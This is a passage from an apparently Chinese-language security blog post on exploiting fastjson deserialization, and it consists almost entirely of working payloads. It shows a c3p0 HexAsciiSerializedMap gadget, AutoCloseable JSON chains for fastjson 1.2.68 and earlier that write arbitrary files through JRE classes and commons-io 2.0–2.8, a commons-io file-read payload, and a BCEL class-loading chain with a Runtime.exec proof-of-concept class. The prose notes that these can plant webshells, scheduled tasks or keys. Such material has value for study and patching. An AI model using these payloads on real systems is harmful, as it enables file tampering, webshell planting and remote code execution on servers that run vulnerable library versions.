\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + string + <span class="string">&quot;;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件读取写入"><a href="#文件读取写入" class="headerlink" title="文件读取写入"></a>文件读取写入</h4><p><font style="color:#000000;">在fastjson &lt;&#x3D; 1.2.68版本中，可以尝试利用预期类中的AutoCloseable进行文件读写操作，结合这个思路，可以尝试写入Webshell&#x2F;计划任务&#x2F;密钥等。</font></p>
<ol>
<li><font style="color:#000000;">JRE8环境下写入文件</font></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/dest.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;append&quot;</span>:<span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;infl&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;input&quot;</span>:<span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><font style="color:#000000;">commons-io 2.0~2.6版本写入文件</font></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">        <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">        <span class="string">&quot;encoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><font style="color:#000000;">commons-io 2.7~2.8版本写入文件</font></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">        <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;start&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;end&quot;</span>:<span class="number">2147483647</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">        <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>commons-io读取文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;abc&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reader&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;url&quot;</span>: <span class="string">&quot;file:///D:/1.txt&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;boms&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bytes&quot;</span>: [<span class="number">66</span>]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h4><p><font style="color:#000000;">利用Tomcat中com.sun.org.apache.bcel.internal.util.ClassLoader#loadclass方法加载bcel字节码，之后调用defineClass进行加载字节码。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Poc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;poc.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">        System.out.println(bytes.length);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;res.txt&quot;</span>));</span><br><span class="line">        bw.write(<span class="string">&quot;$$BCEL$$&quot;</span> + result);</span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>, <span class="comment">// tomcat8的poc，如果小于8的话用到的类是org.apache.tomcat.dbcp.dbcp.BasicDataSource</span></span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span 